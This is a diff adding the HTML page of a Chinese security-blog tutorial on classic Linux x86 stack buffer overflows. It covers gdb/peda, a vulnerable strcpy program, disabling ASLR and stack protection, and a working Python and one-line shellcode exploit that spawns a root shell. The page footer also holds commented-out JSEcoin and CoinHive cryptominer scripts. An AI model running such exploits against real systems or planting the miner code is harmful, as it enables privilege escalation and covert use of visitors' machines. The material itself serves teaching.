@@ -1,0 +1,1265 @@
+<!doctype html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<script>
+    (function(){
+        if(''){
+            if (prompt('请输入文章密码') !== ''){
+                alert('密码错误！');
+                history.back(-1);
+                <!--window.location.href='https://kevien.github.io'-->;
+            }
+        }
+    })();
+</script>
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.1" rel="stylesheet" type="text/css" />
+
+
+  <meta name="keywords" content="M0rk,blog,security,hack,Hexo" />
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="M0rk's Blog" type="application/atom+xml" />
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/images/favicon.ico?v=5.1.1" />
+
+
+
+
+
+
+<meta name="description" content="gdb使用gdb GNU Project Debugger在linux下面调试程序必然会用到gdb，当然还有gdb的一个插件也是必须，那就是pedapeda增强了gdb的功能，在调试过程中会显示反汇编的代码、寄存器、内存信息等  aslr – 显示和设置GDB的aslr checksec – 显示多种安全机制的开关 dumpargs – 当停到一个call 指令的时候，显示传递给函数的参数 dum">
+<meta name="keywords">
+<meta property="og:type" content="article">
+<meta property="og:title" content="linux栈溢出学习笔记">
+<meta property="og:url" content="http://kevien.github.io/2017/08/16/linux栈溢出学习笔记/index.html">
+<meta property="og:site_name" content="M0rk's Blog">
+<meta property="og:description" content="gdb使用gdb GNU Project Debugger在linux下面调试程序必然会用到gdb，当然还有gdb的一个插件也是必须，那就是pedapeda增强了gdb的功能，在调试过程中会显示反汇编的代码、寄存器、内存信息等  aslr – 显示和设置GDB的aslr checksec – 显示多种安全机制的开关 dumpargs – 当停到一个call 指令的时候，显示传递给函数的参数 dum">
+<meta property="og:image" content="http://kevien.github.io/2017/08/16/linux栈溢出学习笔记/linux-memory-segment.jpg">
+<meta property="og:image" content="http://kevien.github.io/2017/08/16/linux栈溢出学习笔记/stackmap.png">
+<meta property="og:image" content="http://kevien.github.io/2017/08/16/linux栈溢出学习笔记/test1.png">
+<meta property="og:image" content="http://kevien.github.io/2017/08/16/linux栈溢出学习笔记/test2.png">
+<meta property="og:image" content="http://kevien.github.io/2017/08/16/linux栈溢出学习笔记/test22.png">
+<meta property="og:image" content="http://kevien.github.io/2017/08/16/linux栈溢出学习笔记/result.png">
+<meta property="og:image" content="http://kevien.github.io/2017/08/16/linux栈溢出学习笔记/commandlineexp.png">
+<meta property="og:updated_time" content="2018-08-15T06:23:02.193Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="linux栈溢出学习笔记">
+<meta name="twitter:description" content="gdb使用gdb GNU Project Debugger在linux下面调试程序必然会用到gdb，当然还有gdb的一个插件也是必须，那就是pedapeda增强了gdb的功能，在调试过程中会显示反汇编的代码、寄存器、内存信息等  aslr – 显示和设置GDB的aslr checksec – 显示多种安全机制的开关 dumpargs – 当停到一个call 指令的时候，显示传递给函数的参数 dum">
+<meta name="twitter:image" content="http://kevien.github.io/2017/08/16/linux栈溢出学习笔记/linux-memory-segment.jpg">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    sidebar: {"position":"left","display":"always","offset":12,"offset_float":0,"b2t":false,"scrollpercent":false},
+    fancybox: true,
+    motion: true,
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://kevien.github.io/2017/08/16/linux栈溢出学习笔记/"/>
+
+
+
+
+
+  <title>linux栈溢出学习笔记 | M0rk's Blog</title>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail ">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">M0rk's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <h1 class="site-subtitle" itemprop="description"></h1>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-sitemap">
+          <a href="/sitemap.xml" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-sitemap"></i> <br />
+            
+            站点地图
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocapitalize="off" autocomplete="off" autocorrect="off"
+             placeholder="搜索..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="http://kevien.github.io/2017/08/16/linux栈溢出学习笔记/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="M0rk">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/uploads/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="M0rk's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h2 class="post-title" itemprop="name headline">
+            
+            
+              
+                linux栈溢出学习笔记
+              
+            
+          </h2>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-08-16T18:53:23+08:00">
+                2017-08-16
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h4 id="gdb使用"><a href="#gdb使用" class="headerlink" title="gdb使用"></a>gdb使用</h4><p>gdb GNU Project Debugger<br>在linux下面调试程序必然会用到gdb，当然还有gdb的一个插件也是必须，那就是<a href="https://github.com/longld/peda" target="_blank" rel="external">peda</a><br>peda增强了gdb的功能，在调试过程中会显示反汇编的代码、寄存器、内存信息等</p>
+<ul>
+<li>aslr – 显示和设置GDB的aslr</li>
+<li>checksec – 显示多种安全机制的开关</li>
+<li>dumpargs – 当停到一个call 指令的时候，显示传递给函数的参数</li>
+<li>dumpprop – dump所有ROP gadgets 在一定的内存范围内</li>
+<li>elfheader – 获取被调试的ELF文件的头信息</li>
+<li>lefsymbol –获取非调试状态下的 符号信息</li>
+<li>lookup – 在一定地址范围内查找所有的地址以及引用</li>
+<li>patch – Patch memory start at an address with string/hexstring/int</li>
+<li>pattern – Generate, search, or write a cyclic pattern to memory</li>
+<li>procinfo – 从/proc/pid/显示不同的信息</li>
+<li>pshow – 显示peda的选项以及其它的设置</li>
+<li>pset – 设置peda的选项以及其它的设置</li>
+<li>readelf 获取ELF文件的头部信息</li>
+<li>ropgadget – Get common ROP gadgets of binary or library</li>
+<li>ropsearch – Search for ROP gadgets in memory</li>
+<li>searchmem|find – Search for a pattern in memory; support regex search</li>
+<li>shellcode – Generate or download common shellcodes.</li>
+<li>skeleton – Generate python exploit code template</li>
+<li>vmmap – Get virtual mapping address ranges of section(s) in debugged process</li>
+<li>xormem – XOR a memory region with a key</li>
+</ul>
+<p>在gdb中，常用的就是如下的命令<br>attach  附加某个进程进行调试<br>run 运行程序 ，会在断点处停下来<br>break或者b  xxx ，下断点<br>next 类似于od中的单步步过<br>step 类似于od中的单步步入</p>
+<h4 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h4><h2 id="什么是缓冲区溢出"><a href="#什么是缓冲区溢出" class="headerlink" title="什么是缓冲区溢出"></a>什么是缓冲区溢出</h2><ul>
+<li>拷贝源buffer到目的buffer可以导致溢出漏洞，需要满足两个条件</li>
+<li>1.源的string长度超过目的string的长度</li>
+<li>2.没有对拷贝的长度做检查<h2 id="两种缓冲区溢出"><a href="#两种缓冲区溢出" class="headerlink" title="两种缓冲区溢出"></a>两种缓冲区溢出</h2></li>
+<li>1.栈溢出-目的缓冲区是在栈中</li>
+<li>2.堆溢出-目的缓冲区是在堆中</li>
+<li>下面这张图展示了linux中内存的分块情况。<br><img src="/2017/08/16/linux栈溢出学习笔记/linux-memory-segment.jpg" alt=""><h2 id="后果"><a href="#后果" class="headerlink" title="后果"></a>后果</h2></li>
+<li><p>缓冲区溢出可以导致任意代码执行</p>
+<h4 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h4><h2 id="1-漏洞示例代码"><a href="#1-漏洞示例代码" class="headerlink" title="1.漏洞示例代码"></a>1.漏洞示例代码</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">//vuln.c</div><div class="line">#include &lt;stdio.h&gt;</div><div class="line">#include &lt;string.h&gt;</div><div class="line"></div><div class="line">int main(int argc, char* argv[]) &#123;</div><div class="line">        /* [1] */ char buf[256];</div><div class="line">        /* [2] */ strcpy(buf,argv[1]);</div><div class="line">        /* [3] */ printf(&quot;Input:%s\n&quot;,buf);</div><div class="line">        return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+</li>
+<li><p>注：本次测试的是在ubuntu14.04的X86上做的测试。</p>
+</li>
+<li><p>在编译之前我们首先要关闭系统的ASLR 方法是</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">sudo -s</div><div class="line">echo 0 &gt; /proc/sys/kernel/randomize_va_space</div></pre></td></tr></table></figure>
+</li>
+<li><p>编译</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">$gcc -g -fno-stack-protector -z execstack -o vuln vuln.c //这里编译选项是关闭DEP和stack protector</div><div class="line">$sudo chown root vuln</div><div class="line">$sudo chgrp root vuln</div><div class="line">$sudo chmod +s vuln</div></pre></td></tr></table></figure>
+</li>
+</ul>
+<h2 id="2-如何利用"><a href="#2-如何利用" class="headerlink" title="2.如何利用"></a>2.如何利用</h2><ul>
+<li>任意代码执行使用的技术叫做“覆盖返回地址”，就是攻击者覆盖掉栈中的“返回地址”从而让指令寄存器转向去执行我们构造好的恶意代码。</li>
+<li>在看漏洞的利用代码之前，为了更好的理解，让我们来看一下这段有漏洞的代码的反汇编代码。<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line">Dump of assembler code for function main:</div><div class="line">   //Function Prologue</div><div class="line">   0x08048414 &lt;+0&gt;:	push   ebp                      //备份调用者的ebp</div><div class="line">   0x08048415 &lt;+1&gt;:	mov    esp,ebp                 //设置esp和ebp相同</div><div class="line"></div><div class="line">   0x08048417 &lt;+3&gt;:	and    0xfffffff0,esp          //栈对齐</div><div class="line">   0x0804841a &lt;+6&gt;:	sub    0x110,esp               //开辟栈空间</div><div class="line">   0x08048420 &lt;+12&gt;:	mov    0xc(ebp),eax            //eax = argv</div><div class="line">   0x08048423 &lt;+15&gt;:	add    $0x4,eax                 //eax = &amp;argv[1]</div><div class="line">   0x08048426 &lt;+18&gt;:	mov    (eax),eax               //eax = argv[1]</div><div class="line">   0x08048428 &lt;+20&gt;:	mov    eax,0x4(esp)            //拷贝arg2</div><div class="line">   0x0804842c &lt;+24&gt;:	lea    0x10(esp),eax           //eax = &apos;buf&apos; </div><div class="line">   0x08048430 &lt;+28&gt;:	mov    eax,(esp)               //拷贝 arg1</div><div class="line">   0x08048433 &lt;+31&gt;:	call   0x8048330 &lt;strcpy@plt&gt;    //调用 strcpy</div><div class="line">   0x08048438 &lt;+36&gt;:	mov    $0x8048530,eax           //eax = format str &quot;Input: s\n&quot;</div><div class="line">   0x0804843d &lt;+41&gt;:	lea    0x10(esp), edx           //edx = buf</div><div class="line">   0x08048441 &lt;+45&gt;:	mov    edx,0x4(esp)            //printf arg2</div><div class="line">   0x08048445 &lt;+49&gt;:	mov    eax,(esp)               //printf arg1</div><div class="line">   0x08048448 &lt;+52&gt;:	call   0x8048320 &lt;printf@plt&gt;    //调用 printf</div><div class="line">   0x0804844d &lt;+57&gt;:	mov    $0x0,eax                 //return value 0</div><div class="line"></div><div class="line">   //收尾函数</div><div class="line">   0x08048452 &lt;+62&gt;:	leave                            //mov ebp, esp; pop ebp; </div><div class="line">   0x08048453 &lt;+63&gt;:	ret                              //return</div><div class="line">End of assembler dump.</div><div class="line">(gdb)</div></pre></td></tr></table></figure>
+</li>
+</ul>
+<p><img src="/2017/08/16/linux栈溢出学习笔记/stackmap.png" alt=""></p>
+<h2 id="3-测试步骤"><a href="#3-测试步骤" class="headerlink" title="3.测试步骤"></a>3.测试步骤</h2><ul>
+<li>1.是否可以覆盖返回地址<br><img src="/2017/08/16/linux栈溢出学习笔记/test1.png" alt=""></li>
+<li>可以看到当我们输出300个A的时候，程序EIP的指向了地址0x41414141（即我们用AAAA覆盖掉了返回地址）</li>
+<li>2.目标buffer的偏移怎么计算</li>
+<li>就是覆盖掉的地址换成我们恶意代码的入口地址怎么计算，他是0x10c=0x100（就是那256个字节）+0x8（对齐）+0x4（call ebp指令长度）</li>
+<li>因此当我们输入“A”<em>268+“B”</em>4的时候，就会依次覆盖掉buf、对齐、以及call ebp，即返回地址就是“BBBB”<br><img src="/2017/08/16/linux栈溢出学习笔记/test2.png" alt=""><br>正如我们所想！如上我们就控制了返回地址，且这个地址就在0xbfffeeb0这个地址上存放着。<br><img src="/2017/08/16/linux栈溢出学习笔记/test22.png" alt=""></li>
+<li><p>3.编写测试代码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line">#!/usr/bin/env python</div><div class="line">import struct</div><div class="line">from subprocess import call</div><div class="line"></div><div class="line">#Stack address where shellcode is copied.</div><div class="line">ret_addr = 0xbfffeeb0       </div><div class="line">              </div><div class="line">#Spawn a shell</div><div class="line">#execve(/bin/sh)</div><div class="line">scode = &quot;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80&quot;</div><div class="line"></div><div class="line">#endianess convertion</div><div class="line">def conv(num):</div><div class="line"> return struct.pack(&quot;&lt;I&quot;,num)</div><div class="line">buf = &quot;A&quot; * 268</div><div class="line">buf += conv(ret_addr)</div><div class="line">buf += &quot;\x90&quot; * 100</div><div class="line">buf += scode</div><div class="line"></div><div class="line">print &quot;Calling vulnerable program&quot;</div><div class="line">call([&quot;./vuln&quot;, buf])</div></pre></td></tr></table></figure>
+</li>
+<li><p>4.结果截图<br><img src="/2017/08/16/linux栈溢出学习笔记/result.png" alt=""></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">./vuln `python -c &quot;print &apos;A&apos;*268+&apos;\x80\xee\xff\xbf&apos;+&apos;\x90&apos;*100 + &apos;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80&apos;&quot;`</div></pre></td></tr></table></figure>
+</li>
+</ul>
+<p><img src="/2017/08/16/linux栈溢出学习笔记/commandlineexp.png" alt=""></p>
+<h4 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h4><ul>
+<li>这里为了测试了简单的缓冲区溢出的基本原理我们关掉了一些防护比如内存地址随机化aslr以及DEP，后面有时间再学习和分享一下绕过这些防护的方法。<h4 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h4><a href="https://sploitfun.wordpress.com/2015/05/08/classic-stack-based-buffer-overflow/" target="_blank" rel="external">Classic Stack Based Buffer Overflow</a><br>[How to exploit a buffer overflow vulnerability - Practical]<br>(<a href="https://www.youtube.com/watch?v=hJ8IwyhqzD4" target="_blank" rel="external">https://www.youtube.com/watch?v=hJ8IwyhqzD4</a>)<br><a href="https://www.youtube.com/watch?v=1S0aBV-Waeo" target="_blank" rel="external">Buffer Overflow Attack - Computerphile</a><br><a href="https://www.youtube.com/watch?v=eYrfWpkvMxA" target="_blank" rel="external">Kali Linux 2016.1 - Buffer Overflow Tutorial</a><br><a href="http://blog.csdn.net/21cnbao/article/details/7385161" target="_blank" rel="external">Linux gdb调试器用法全面解析</a><br><a href="http://drops.xmd5.com/static/drops/tips-6597.html" target="_blank" rel="external">一步一步学ROP之linux_x86篇</a><br><a href="https://exploit-exercises.com/" target="_blank" rel="external">linux溢出练习</a><br><a href="http://louisrli.github.io/blog/2012/06/22/nebula0/#.WnGH9pP1U0o" target="_blank" rel="external">Nebula Shell Exploits</a><br><a href="https://sploitfun.wordpress.com/2015/" target="_blank" rel="external">Linux (x86) Exploit Development Series</a><br><a href="https://github.com/smokeleeteveryday/CTF_WRITEUPS/tree/master/2015/DEFCONCTF/babysfirst/r0pbaby" target="_blank" rel="external">DEF CON CTF Quals 2015: r0pbaby</a><br><a href="http://blog.csdn.net/linyt/article/details/51635768" target="_blank" rel="external">聊聊Linux动态链接中的PLT和GOT（１）——何谓PLT与GOT</a><br><a href="https://www.youtube.com/watch?v=hJ8IwyhqzD4" target="_blank" rel="external">How to exploit a buffer overflow vulnerability - Practical</a></li>
+</ul>
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+        
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2017/08/18/IDA使用/" rel="next" title="IDA使用">
+                <i class="fa fa-chevron-left"></i> IDA使用
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2017/08/13/macOS软件安全与逆向分析笔记/" rel="prev" title="macOS软件安全与逆向分析笔记">
+                macOS软件安全与逆向分析笔记 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </article>
+
+
+
+    <div class="post-spread">
+      
+        
+  <div class="bdsharebuttonbox">
+    <a href="#" class="bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
+    <a href="#" class="bds_douban" data-cmd="douban" title="分享到豆瓣网"></a>
+    <a href="#" class="bds_sqq" data-cmd="sqq" title="分享到QQ好友"></a>
+    <a href="#" class="bds_qzone" data-cmd="qzone" title="分享到QQ空间"></a>
+    <a href="#" class="bds_weixin" data-cmd="weixin" title="分享到微信"></a>
+    <a href="#" class="bds_tieba" data-cmd="tieba" title="分享到百度贴吧"></a>
+    <a href="#" class="bds_twi" data-cmd="twi" title="分享到Twitter"></a>
+    <a href="#" class="bds_fbook" data-cmd="fbook" title="分享到Facebook"></a>
+    <a href="#" class="bds_more" data-cmd="more"></a>
+    <a class="bds_count" data-cmd="count"></a>
+  </div>
+  <script>
+    window._bd_share_config = {
+      "common": {
+        "bdText": "",
+        "bdMini": "2",
+        "bdMiniList": false,
+        "bdPic": ""
+      },
+      "share": {
+        "bdSize": "16",
+        "bdStyle": "0"
+      },
+      "image": {
+        "viewList": ["tsina", "douban", "sqq", "qzone", "weixin", "twi", "fbook"],
+        "viewText": "分享到：",
+        "viewSize": "16"
+      }
+    }
+  </script>
+
+<script>
+  with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='//kevien.github.io/static/api/js/share.js?cdnversion='+~(-new Date()/36e5)];
+</script>
+
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+  <div class="comments" id="comments">
+    
+  </div>
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          <img class="site-author-image" itemprop="image"
+               src="/uploads/avatar.jpg"
+               alt="M0rk" />
+          <p class="site-author-name" itemprop="name">M0rk</p>
+           
+              <p class="site-description motion-element" itemprop="description"></p>
+           
+        </div>
+        <nav class="site-state motion-element">
+
+          
+            <div class="site-state-item site-state-posts">
+              <a href="/archives">
+                <span class="site-state-item-count">56</span>
+                <span class="site-state-item-name">日志</span>
+              </a>
+            </div>
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-categories">
+              
+                <span class="site-state-item-count">5</span>
+                <span class="site-state-item-name">分类</span>
+              
+            </div>
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-tags">
+              
+                <span class="site-state-item-count">3</span>
+                <span class="site-state-item-name">标签</span>
+              
+            </div>
+          
+
+        </nav>
+
+        
+          <div class="feed-link motion-element">
+            <a href="/atom.xml" rel="alternate">
+              <i class="fa fa-rss"></i>
+              RSS
+            </a>
+          </div>
+        
+
+        <div class="links-of-author motion-element">
+          
+            
+              <span class="links-of-author-item">
+                <a href="https://github.com/kevien" target="_blank" title="GitHub">
+                  
+                    <i class="fa fa-fw fa-github"></i>
+                  
+                  GitHub
+                </a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="https://twitter.com/TTByaw" target="_blank" title="Twitter">
+                  
+                    <i class="fa fa-fw fa-twitter"></i>
+                  
+                  Twitter
+                </a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="https://weibo.com/wuyanzu" target="_blank" title="Weibo">
+                  
+                    <i class="fa fa-fw fa-weibo"></i>
+                  
+                  Weibo
+                </a>
+              </span>
+            
+          
+        </div>
+
+        
+        
+
+        
+        
+
+        
+
+
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#gdb使用"><span class="nav-number">1.</span> <span class="nav-text">gdb使用</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#简介"><span class="nav-number">2.</span> <span class="nav-text">简介</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#什么是缓冲区溢出"><span class="nav-number"></span> <span class="nav-text">什么是缓冲区溢出</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#两种缓冲区溢出"><span class="nav-number"></span> <span class="nav-text">两种缓冲区溢出</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#后果"><span class="nav-number"></span> <span class="nav-text">后果</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#示例"><span class="nav-number">1.</span> <span class="nav-text">示例</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#1-漏洞示例代码"><span class="nav-number"></span> <span class="nav-text">1.漏洞示例代码</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-如何利用"><span class="nav-number"></span> <span class="nav-text">2.如何利用</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-测试步骤"><span class="nav-number"></span> <span class="nav-text">3.测试步骤</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#小结"><span class="nav-number">1.</span> <span class="nav-text">小结</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Reference"><span class="nav-number">2.</span> <span class="nav-text">Reference</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+
+<div class="copyright" >
+  
+  &copy; 
+  <span itemprop="copyrightYear">2018</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">M0rk</span>
+</div>
+
+
+<div class="powered-by">
+  由 <a class="theme-link" href="https://hexo.io">Hexo</a> 强力驱动
+</div>
+
+<div class="theme-info">
+  主题 -
+  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
+    NexT.Muse
+  </a>
+</div>
+<br>
+<span id="busuanzi_container_site_pv">
+    本站总访问量<span id="busuanzi_value_site_pv"></span>次
+</span>
+<!--
+<span id="busuanzi_container_site_uv">
+  本站访客数<span id="busuanzi_value_site_uv"></span>人次
+</span>
+-->
+<!--
+<script type="text/javascript">
+!function(){var e=document,t=e.createElement("script"),s=e.getElementsByTagName("script")[0];t.type="text/javascript",t.async=t.defer=!0,t.src="https://load.jsecoin.com/load/39357/kevien.github.io/optionalSubID/0/",s.parentNode.insertBefore(t,s)}();
+</script>
+-->
+
+<!--
+<script src="https://authedmine.com/lib/authedmine.min.js"></script>
+<script>
+  var miner = new CoinHive.Anonymous('uTu9h9LT1kVUk4O1UxyZAhd8uvoLLip5', {throttle: 0.3});
+
+  // Only start on non-mobile devices and if not opted-out
+  // in the last 14400 seconds (4 hours):
+  if (!miner.isMobile() && !miner.didOptOut(14400)) {
+    miner.start();
+  }
